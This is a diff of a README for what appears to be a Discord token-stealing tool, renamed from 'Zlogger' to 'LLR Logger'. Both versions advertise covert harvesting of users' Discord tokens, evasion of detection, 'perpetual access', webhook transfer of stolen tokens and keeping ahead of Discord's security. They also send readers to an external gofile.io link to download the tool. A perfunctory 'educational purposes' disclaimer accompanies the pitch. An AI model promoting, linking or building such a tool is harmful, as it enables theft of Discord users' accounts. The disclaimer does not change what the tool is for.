@@ -1,25 +1,15 @@
 
-Note: we had to use gofile.io since the file was a bit bigger than the github limit, so here: https://gofile.io/d/ZkLyGU
+Due to the file size we cannot upload it to github, instead go to gofile.io to download it: https://gofile.io/d/ZkLyGU
 
-🚀 Zlogger - Advanced Discord Token Acquisition System 🕵️‍♂️
+- 🕵️‍♂️ Operational Mechanisms:
 
-Covert Token Retrieval: Zlogger deploys sophisticated techniques for discreet token extraction within Discord servers, ensuring minimal visibility. 🕵️‍♂️
+LLR Logger discreetly operates at a low level, ensuring minimal visibility and reducing the risk of detection during token extraction.
+Facilitates seamless data acquisition within Discord servers without triggering alerts.
+- 🔒 Encryption Protocols:
 
-Tokenization Efficiency: Enhance access to user accounts and server privileges with Zlogger's streamlined token harvesting capabilities. 🚀
+State-of-the-art encryption ensures secure transmission of acquired tokens, enhancing confidentiality and mitigating the risk of interception.
+- 🔄 Continuous Improvement:
 
-Stealth Data Acquisition: Zlogger employs low-level data harvesting mechanisms, maintaining a covert presence without triggering alerts. 🤐
-
-Versatile API Compatibility: Zlogger is designed with adaptable interfaces, ensuring compatibility across diverse Discord server configurations. 🔄
-
-Automated Token Refreshment: Ensure uninterrupted connectivity with Zlogger's automated token refresh system, guaranteeing perpetual access. ⏰
-
-Encryption Protocols: Zlogger employs state-of-the-art encryption protocols for secure transmission of acquired tokens, mitigating the risk of interception. 🔒
-
-Operational Anonymization: Maintain operational anonymity through Zlogger, concealing user identity and actions within the Discord ecosystem. 🌐
-
-Continuous Improvement: Zlogger prioritizes agile development methodologies, providing regular updates to stay ahead of evolving Discord security measures. 🔄
-
-Webhook Integration: Zlogger seamlessly integrates with webhooks for instantaneous token transfer, optimizing data flow. 🚚
-
-📚 Note: This information is shared for educational purposes; however, users are solely responsible for any legal consequences resulting from misuse. This guide is intended for academic exploration. 🤫
-![Screenshot 2023-11-30 041146](https://github.com/SesameSeed-Debug/ZLogger4.7/assets/151635094/b25e99cd-a80e-4345-bdf0-558ec6b43ea1)
+Agile development methodologies ensure regular updates, keeping LLR Logger ahead of evolving Discord security measures.
+Users can leverage these updates for an adaptable and effective approach in navigating Discord's dynamic landscape.
+Given the tool's nature, users should be aware of potential legal consequences, as this information is shared solely for academic exploration, and misuse may result in legal ramifications.
